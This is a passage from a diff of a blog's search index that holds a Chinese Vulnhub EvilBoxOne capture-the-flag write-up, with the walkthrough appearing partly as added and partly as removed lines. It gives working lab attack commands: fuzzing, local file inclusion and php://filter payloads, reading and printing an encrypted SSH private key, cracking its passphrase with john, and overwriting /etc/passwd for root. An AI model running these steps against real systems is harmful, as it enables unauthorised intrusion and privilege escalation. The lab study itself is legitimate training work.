class="line">HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line">9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line">94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr</span><br><span class="line">Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line">62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp</span><br><span class="line">4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line">8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
+<p><strong>第三步，利用私钥登录</strong></p>
+<p>将私钥写入到一个文件，然后执行下面命令 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -i id_rsa <span class="comment"># 文件名可以任意</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406231421.png" /></p>
+<hr />
+<p><strong>提示</strong>：</p>
+<p>不论将私钥所在的文件名是什么，一定要将权限设置为600，否则会报错，提示权限不够。（一般公、私钥的文件配置都是600）就像下图一样：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406231324.png" /></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
+<hr />
+<p>使用私钥登录发现还需要输入一个<code>passphrase</code>。</p>
+<blockquote>
+<p>公私钥对生成的时候，有时候会给私钥加一个密码，要想利用公钥登录方式的话，就必须输入加密私钥的密码。 可以使用密码爆破。有hashcat， john等工具</p>
+</blockquote>
+<p>先将 id_rsa 进行格式转换为john能够识别的（目录在<code>/usr/share/john</code>）： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./ssh2john.py /home/hdfzzf/id_rsa &gt; /home/hdfzzf/<span class="built_in">hash</span></span><br></pre></td></tr></table></figure></p>
+<p>然后进行破解（最好找一个大一点的字典，建议<code>/usr/share/wordlists/rockyou.txt.gz</code>）： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=rockyou.txt <span class="comment"># 将字典和hash放到同一目录</span></span><br><span class="line"></span><br><span class="line">爆破结果：unicorn</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406232742.png" /></p>
+<p>再次利用SSH公钥登录 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. ssh mowree@10.0.2.9 -i id_rsa</span><br><span class="line">2. 输入密码：unicorn</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406232911.png" /></p>
+<p>成功get shell！</p>
+<h2 id="权限提升">权限提升</h2>
+<p>Linux本题提权可以使用：内核漏洞、SUID、SUDO配置、crontab任务。其中查找SUID/SGID文件可以用下面的命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null <span class="comment"># 4000代表suid权限，2000代表SGID；后面的表示不显示报错信息</span></span><br></pre></td></tr></table></figure></p>
+<p>要查找第三方编写的程序是否具有SUID/SGID。经查找发现并没有可用的。</p>
+<p>这里介绍一个新的提权思路：<strong>查找靶机上当前用户拥有写权限且拥有者为root的文件，然后改写文件内容实现提权（比如写入nc反弹shell的命令）</strong>。</p>
+<p>利用下述命令寻找拥有写权限的文件。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v proc|grep -v run|grep -v sys</span><br><span class="line"></span><br><span class="line">查找拥有写权限的文件。过滤proc目录，该目录的文件是系统运行过程中动态生成的。一般run，sys目录也不用看</span><br><span class="line"></span><br><span class="line">2: 表示标准错误</span><br><span class="line"><span class="string">&#x27;&gt;&#x27;</span>: 重定向</span><br><span class="line">/dev/null: 是空设备，它接受您想要的任何输入并将其丢弃。它可以用来抑制任何输出。</span><br></pre></td></tr></table></figure></p>
+<p>此时注意到这么一个文件：<code>/etc/passwd</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407085603.png" /></p>
+<p>这个文件存储的靶机上所有用户的信息，一般用户只有读权限，而没有写权限。而这台靶机上却拥有写权限，这是一个极大的漏洞！</p>
+<blockquote>
+<p>小知识：<code>/etc/passwd</code>里面的第二个字段是密码字段，一般都只有一个x，表示密码已加密保存在<code>/etc/shadow</code>（这文件普通用户连读权限都没有）。但是，优先级是<code>/etc/passwd</code>优先，也就是如果<code>/etc/passwd</code>里面密码字段保存了密码，那么<code>/etc/shadow</code>中的密码就会失效！</p>
+</blockquote>
+<p>接下来的思路很明确了，修改<code>/etc/passwd</code>中root的密码字段，然后直接用<code>su -</code>命令切换。（也可以直接添加一条记录<code>echo "root2:加密密码:0:0:root:/root:/bin/bash"</code>，因为用户名不是最重要的，重要的是uid，uid为0即使用户名不是root，也拥有root权限。）</p>
+<p>生成密码的加密密文： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 <span class="comment"># -1 某种加密算法</span></span><br><span class="line"></span><br><span class="line">明文：root</span><br><span class="line">密文：$1$yKHIKZSK<span class="variable">$R26qtrasBuYAfoQJvngpU0</span></span><br></pre></td></tr></table></figure></p>
+<p>（这里操作需要注意：需要在正常模式下删除和粘贴密码，插入模式下上下左右删都会被解析为字符）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407090904.png" /></p>
+<p>然后 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su - 或者 su root <span class="comment"># 登录root</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407090950.png" /></p>
+<p>成功登录。</p>
+<p>第一个flag在<code>/home/mowree/user.txt</code>，第二个flag在<code>/root/root.txt</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.txt: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</span><br><span class="line">root.txt: 36QtXfdJWvdC0VavlPIApUbDlqTsBM</span><br></pre></td></tr></table></figure>
+<p>到此，本台靶机的渗透结束。</p>
+<h2 id="验证操作">验证操作</h2>
+<p>发现即使改了root的密码，也无法直接用ssh直接登录root，原因是权限不够。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407091627.png" /></p>
+<p>但是，如果改了<code>mowree</code>的密码，则可以直接使用ssh的密码登录。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407091712.png" /></p>
+<h1 id="总结">总结</h1>
+<p>对该靶机的练习，学到了许多东西。</p>
+<p>在web方面，除了之前的路径爆破之外，还了解到了<strong>参数爆破</strong>。已经<strong>文件包含漏洞的利用</strong>。在权限提升和反弹shell上，学到了<strong>SSH爆破</strong>和<strong>SSH公钥登录</strong>，还有这其中使用的一些小工具。</p>
+<p>还有一些Linux的小知识，比如可以多返回几次上一级目录，以及<code>find</code>命令的基本使用等。</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>SSH公钥登录</tag>
+        <tag>参数爆破</tag>
+        <tag>PHP伪协议</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>5. Vulvhub SocialNetwork2.0 Writeup</title>
     <url>/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/</url>
     <content><![CDATA[<p>该靶机难度困难，涉及到逆向（不会！）。这个靶机的难点就是在缓冲区溢出漏洞。</p>
@@ -2014,175 +2183,6 @@
         <tag>缓冲区溢出漏洞</tag>
         <tag>XMLRPC命令执行</tag>
         <tag>动态调试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>6 Vulnhub EvilBoxOne Writeup</title>
-    <url>/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/</url>
-    <content><![CDATA[<p>该靶机难度介于简单和中等之间。不过还是能够学到很多知识。</p>
-<span id="more"></span>
-<h1 id="靶机信息">靶机信息</h1>
-<p>靶机地址：<a href="https://www.vulnhub.com/entry/evilbox-one,736/">evilbox_one</a></p>
-<p>难度：Easy/Medium (Intermediate)</p>
-<p>目标：取得root权限 + 2 Flag</p>
-<p>涉及攻击方法：</p>
-<ul>
-<li>主机发现</li>
-<li>端口扫描</li>
-<li>强制访问（路径爆破）</li>
-<li><strong>参数爆破</strong></li>
-<li>文件包含</li>
-<li>PHP封装器（伪协议）</li>
-<li>任意文件读取</li>
-<li><strong>SSH公钥登录</strong></li>
-<li><strong>离线密码破解</strong></li>
-<li>系统权限漏洞利用</li>
-</ul>
-<h1 id="渗透">渗透</h1>
-<p>攻击机kali：10.0.2.4</p>
-<h2 id="主机发现">主机发现</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fping -gaq 10.0.2.0/24</span><br><span class="line"></span><br><span class="line">-a: 显示可ping通的目标</span><br><span class="line">-g: 生成目标列表(不能与 -f 同时使用)，可指定目标的开始和结束IP， 或者提供ip的子网掩码</span><br><span class="line">-q: 安静模式(不显示每个目标或每个ping的结果)</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214147.png" /></p>
-<p>靶机的IP为：10.0.2.9</p>
-<h2 id="端口扫描">端口扫描</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.9</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214333.png" /></p>
-<p>靶机打开了两个端口：22和80</p>
-<h2 id="端口服务发现">端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A 10.0.2.9</span><br><span class="line"></span><br><span class="line">-A 等价于 -sV -sC -O 的组合</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214416.png" /></p>
-<ul>
-<li>22端口的服务为ssh，这里其实可以尝试爆破</li>
-<li>80端口的服务为http，CMS是Apache2，版本为2.4.38</li>
-<li>靶机操作系统为Debian</li>
-<li>系统内核版本为 4.x或者5.x，该工具猜测为4.15-5.6</li>
-<li>其他信息</li>
-</ul>
-<h2 id="访问http服务">访问http服务</h2>
-<p>访问<code>10.0.2.9:80</code>发现是apache2的一个界面，没有其他信息了。此时看一下源码和抓包，发现都没有信息，因此直接进行路径爆破。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406220602.png" /></p>
-<p>发现了一个新的目录<code>/secret</code>，直接访问发现什么都没有，包括源码也是什么都没有。此时针对这个刚发现的目录再次进行路径爆破。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406220925.png" /></p>
-<p>发现了在该目录下还存在着两个文件。把每一个都访问一下。发现两个文件的内容都为空。此时，有可能是该网页只有传入参数才能够显示一些内容，但是我们并不知道有哪些参数，并且参数的值应该为什么也不知道。这时候就可以利用<strong>参数爆破</strong>。</p>
-<h2 id="参数爆破">参数爆破</h2>
-<p>参数爆破时，参数值一般有两种情况：</p>
-<ol type="1">
-<li>数字、字母这些常见的值以及容易引起SQL注入的字符（如单引号）等；</li>
-<li>网页上可能存在文件包含（如果没有传入文件名，很有可能内容为空），此时就需要将网站已经存在的文件名作为参数值</li>
-</ol>
-<p>先尝试第一种情况： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w [参数字典]:PARAM -w [参数值字典]:VAL -u http://10.0.2.9/secret/evil.php?PARAM=VAL -fs 0</span><br><span class="line"></span><br><span class="line">-fs 过滤。 -fs 0 表示如果页面返回的内容为空则过滤（不显示）</span><br></pre></td></tr></table></figure></p>
-<p>发现没有任何结果。那么接下来尝试第二种情况： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.0.2.9/secret/evil.php?FUZZ=../index.html -fs 0</span><br><span class="line"></span><br><span class="line">如果只有一个参数，可以用上面，FUZZ会自动使用字典来代替</span><br></pre></td></tr></table></figure></p>
-<p>（这里因为<code>secret</code>目录下的<code>index.html</code>内容为空，所以使用网站目录下的<code>index.html</code>）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406221820.png" /></p>
-<p>此时爆出一个参数名 command。我们用浏览器验证一下。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406221946.png" /></p>
-<p>发现确实存在，这像是<strong>文件包含漏洞</strong>，如果我们包含<code>evil.php</code>发现结果和直接访问是一样的。输入如下payload验证一下是否存在该漏洞： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../../../../../etc/passwd</span><br></pre></td></tr></table></figure></p>
-<p>（Linux中 <code>cd ..</code> 是返回上一级目录，如果<code>cd ../../../../../</code>返回五次上级目录，如果不够5次，那就返回到根目录则停止。）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406224234.png" /></p>
-<p>发现确实存在<strong>文件包含漏洞</strong>。</p>
-<h2 id="文件包含漏洞利用">文件包含漏洞利用</h2>
-<p>文件包含漏洞的利用一般有以下几种：</p>
-<ol type="1">
-<li>如果存在<strong>远程文件包含</strong>，则可以在自己的主机写一句话，然后让靶机包含该文件；</li>
-<li>如果不存在<strong>远程文件包含</strong>，利用伪协议往靶机写入一句话；</li>
-<li>如果前两者都不行，那么就利用伪协议进行信息收集；</li>
-</ol>
-<h3 id="远程文件包含">远程文件包含</h3>
-<p>先验证是否存在远程文件包含，随便在kali上写一个文件： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello world!</span><br></pre></td></tr></table></figure></p>
-<p>然后开启http服务（先用浏览器访问一下是否成功开启）： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start apache2</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406222903.png" /></p>
-<p>最后，在url包含kali上的该文件，如果显示的内容与上图相同则说明存在远程包含。很可惜，结果是空，也就是不存在该漏洞。</p>
-<h3 id="伪协议写文件">伪协议写文件</h3>
-<blockquote>
-<p>php://filter默认是read，但是可以write！利用这个可以写一句话。但是可能没有写入的权限。</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=test.php&amp;txt=aGVsbG8gd29ybGQ=</span><br><span class="line"></span><br><span class="line">hello world经过base64编码：aGVsbG8gd29ybGQ=</span><br></pre></td></tr></table></figure>
-<p>访问之后发现页面还是空白，并不知道是否成功写入（默认写在当前目录）。直接访问该文件验证一下。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406223423.png" /></p>
-<p>发现并没有写入成功，因此证明没有写文件的权限。</p>
-<h3 id="伪协议信息收集">伪协议信息收集</h3>
-<p>可以先读取<code>evil.php</code>的内容。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure></p>
-<p>将得到的结果base64解码后得到： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这也说明了该文件确实存在<strong>文件包含漏洞</strong>。</p>
-<h2 id="边界突破get-shell">边界突破（GET SHELL）</h2>
-<h3 id="ssh爆破">SSH爆破</h3>
-<p>从之前的信息收集发现有两个账号： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash</span><br></pre></td></tr></table></figure></p>
-<p>因此尝试对这两个账号进行密码爆破。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l user.txt -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://10.0.2.9  </span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406225551.png" /></p>
-<p>发现并没有成功，当然也可能是我的字典太小了。因此尝试其他办法。</p>
-<h3 id="ssh私钥泄露ssh公钥登录">SSH私钥泄露（SSH公钥登录）</h3>
-<p>本来思路已经断了，就去搜索了一下，发现SSH除了密码登陆之外还可能存在着公钥登录，不过需要知道私钥，不过可以利用<strong>文件包含漏洞</strong>来读取私钥。</p>
-<p><strong>第一步，先判断以下靶机是否支持SSH公钥登录</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -v</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406225910.png" /></p>
-<p>注意箭头指向的那句话，说明<code>mowree</code>存在公钥登录。（虽然root也存在，但是私钥和公钥文件一般保存在用户家目录，而我们肯定没有权限读取root目录下的文件，否则也不用get shell）</p>
-<p><strong>第二步，读取公钥和私钥的信息</strong></p>
-<blockquote>
-<p>如果支持公钥登录的话，那么该用户的家目录应该包含相关的信息，比如默认位置 公钥：<code>/home/username/.ssh/authorized_keys</code>（可以看到加密算法） 私钥：<code>/home/username/.ssh/id_rsa</code>（如果加密算法为rsa的话）</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.0.2.9/secret/evil.php?<span class="built_in">command</span>=../../../../../home/mowree/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.0.2.9/secret/evil.php?<span class="built_in">command</span>=../../../../../home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
-<p>查看页面源码的格式比较好看（注意格式不要改变）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E</span><br><span class="line">uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot</span><br><span class="line">b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span class="line">HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line">9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line">94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr</span><br><span class="line">Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line">62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp</span><br><span class="line">4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line">8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
-<p><strong>第三步，利用私钥登录</strong></p>
-<p>将私钥写入到一个文件，然后执行下面命令 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -i id_rsa <span class="comment"># 文件名可以任意</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406231421.png" /></p>
-<hr />
-<p><strong>提示</strong>：</p>
-<p>不论将私钥所在的文件名是什么，一定要将权限设置为600，否则会报错，提示权限不够。（一般公、私钥的文件配置都是600）就像下图一样：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406231324.png" /></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
-<hr />
-<p>使用私钥登录发现还需要输入一个<code>passphrase</code>。</p>
-<blockquote>
-<p>公私钥对生成的时候，有时候会给私钥加一个密码，要想利用公钥登录方式的话，就必须输入加密私钥的密码。 可以使用密码爆破。有hashcat， john等工具</p>
-</blockquote>
-<p>先将 id_rsa 进行格式转换为john能够识别的（目录在<code>/usr/share/john</code>）： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./ssh2john.py /home/hdfzzf/id_rsa &gt; /home/hdfzzf/<span class="built_in">hash</span></span><br></pre></td></tr></table></figure></p>
-<p>然后进行破解（最好找一个大一点的字典，建议<code>/usr/share/wordlists/rockyou.txt.gz</code>）： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=rockyou.txt <span class="comment"># 将字典和hash放到同一目录</span></span><br><span class="line"></span><br><span class="line">爆破结果：unicorn</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406232742.png" /></p>
-<p>再次利用SSH公钥登录 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. ssh mowree@10.0.2.9 -i id_rsa</span><br><span class="line">2. 输入密码：unicorn</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406232911.png" /></p>
-<p>成功get shell！</p>
-<h2 id="权限提升">权限提升</h2>
-<p>Linux本题提权可以使用：内核漏洞、SUID、SUDO配置、crontab任务。其中查找SUID/SGID文件可以用下面的命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null <span class="comment"># 4000代表suid权限，2000代表SGID；后面的表示不显示报错信息</span></span><br></pre></td></tr></table></figure></p>
-<p>要查找第三方编写的程序是否具有SUID/SGID。经查找发现并没有可用的。</p>
-<p>这里介绍一个新的提权思路：<strong>查找靶机上当前用户拥有写权限且拥有者为root的文件，然后改写文件内容实现提权（比如写入nc反弹shell的命令）</strong>。</p>
-<p>利用下述命令寻找拥有写权限的文件。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v proc|grep -v run|grep -v sys</span><br><span class="line"></span><br><span class="line">查找拥有写权限的文件。过滤proc目录，该目录的文件是系统运行过程中动态生成的。一般run，sys目录也不用看</span><br><span class="line"></span><br><span class="line">2: 表示标准错误</span><br><span class="line"><span class="string">&#x27;&gt;&#x27;</span>: 重定向</span><br><span class="line">/dev/null: 是空设备，它接受您想要的任何输入并将其丢弃。它可以用来抑制任何输出。</span><br></pre></td></tr></table></figure></p>
-<p>此时注意到这么一个文件：<code>/etc/passwd</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407085603.png" /></p>
-<p>这个文件存储的靶机上所有用户的信息，一般用户只有读权限，而没有写权限。而这台靶机上却拥有写权限，这是一个极大的漏洞！</p>
-<blockquote>
